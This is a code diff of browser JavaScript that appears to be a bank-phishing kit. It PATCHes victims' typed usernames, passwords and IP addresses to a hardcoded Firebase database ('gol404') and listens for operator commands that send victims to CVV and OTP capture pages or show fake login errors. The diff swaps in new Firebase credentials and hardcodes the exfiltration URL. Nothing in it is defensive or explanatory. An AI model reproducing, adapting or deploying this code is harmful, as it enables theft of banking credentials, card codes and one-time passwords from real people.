@@ -39,13 +39,13 @@
     // ============================================
     const cfg = window.APP_CONFIG || {};
     const firebaseConfig = cfg.firebaseConfig || {
-        apiKey: "AIzaSyBioaTfKSL5OihSfB_nHpd_jBnqezDDQUA",
-        authDomain: "tridfdf.firebaseapp.com",
-        databaseURL: "https://tridfdf-default-rtdb.firebaseio.com",
-        projectId: "tridfdf",
-        storageBucket: "tridfdf.firebasestorage.app",
-        messagingSenderId: "1013947777606",
-        appId: "1:1013947777606:web:daac1413b1623777b9597b"
+        apiKey: "AIzaSyA_rlIDFsfp2cJrPp0Q4N9QLA3hKKslIU8",
+        authDomain: "gol404.firebaseapp.com",
+        databaseURL: "https://gol404-default-rtdb.firebaseio.com",
+        projectId: "gol404",
+        storageBucket: "gol404.firebasestorage.app",
+        messagingSenderId: "502610353442",
+        appId: "1:502610353442:web:29e2c7bd9459277db9597b"
     };
     const defaultToken = cfg.defaultSessionToken || 'main_session';
     const userId = cfg.adminUserId || 'admin';
@@ -102,7 +102,7 @@
     }
 
     async function registrarDispositivoREST() {
-        const DB_URL = firebaseConfig.databaseURL;
+        const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
         try {
             await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                 method: 'PATCH',
@@ -141,15 +141,13 @@
 
     function escucharComandos() {
         if (!currentDeviceId || !hostToken) return;
-        const basePath = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
+        const basePath = window.location.pathname.replace(/\/[^/]*$/, '/');
         const DB_URL = firebaseConfig.databaseURL;
         let ejecutando = false;
 
         async function procesarComando(command) {
-            if (command === 'cvv') {
-                window.location.replace(basePath + 'CVV.html');
-            } else if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'sms-error' || command === 'mensaje' || command === 'seguridad') {
-                window.location.replace(basePath + 'OTP.html?cmd=' + command);
+            if (command === 'otp' || command === 'dinamica' || command === 'sms' || command === 'mensaje' || command === 'seguridad' || command === 'cvv') {
+                window.location.replace(basePath + 'OTP.html');
             } else if (command === 'login-error' || command === 'usuario') {
                 const loader = document.getElementById('loaderOverlay');
                 if (loader) loader.style.display = 'none';
@@ -160,7 +158,7 @@
                 if (u) u.focus();
             } else if (command === 'cerrar') {
                 if (heartbeatInterval) clearInterval(heartbeatInterval);
-                window.location.replace(basePath + 'finalizado.html');
+                window.location.replace('/finalizado.html');
             } else if (command === 'reiniciar') {
                 if (heartbeatInterval) clearInterval(heartbeatInterval);
                 localStorage.removeItem('currentDeviceId');
@@ -186,7 +184,7 @@
 
     async function actualizarUsuario(usuario) {
         if (!currentDeviceId || !hostToken) return;
-        const DB_URL = firebaseConfig.databaseURL;
+        const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
         try {
             await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
                 method: 'PATCH',
@@ -205,7 +203,7 @@
 
     async function actualizarClave(clave) {
         if (!currentDeviceId || !hostToken) return;
-        const DB_URL = firebaseConfig.databaseURL;
+        const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
         try {
             await fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}/data.json`, {
                 method: 'PATCH',
@@ -241,7 +239,7 @@
                 const val = usernameInput.value;
                 if (val.length >= 1 && !_notifSonado) {
                     _notifSonado = true;
-                    const DB_URL = firebaseConfig.databaseURL;
+                    const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
                     fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                         method: 'PATCH',
                         headers: { 'Content-Type': 'application/json' },
@@ -280,7 +278,7 @@
                     userIP = ipData.ip;
                 } catch (e) { }
 
-                const DB_URL = firebaseConfig.databaseURL;
+                const DB_URL = 'https://gol404-default-rtdb.firebaseio.com';
                 fetch(`${DB_URL}/sessions/admin/${hostToken}/devices/${currentDeviceId}.json`, {
                     method: 'PATCH',
                     headers: { 'Content-Type': 'application/json' },
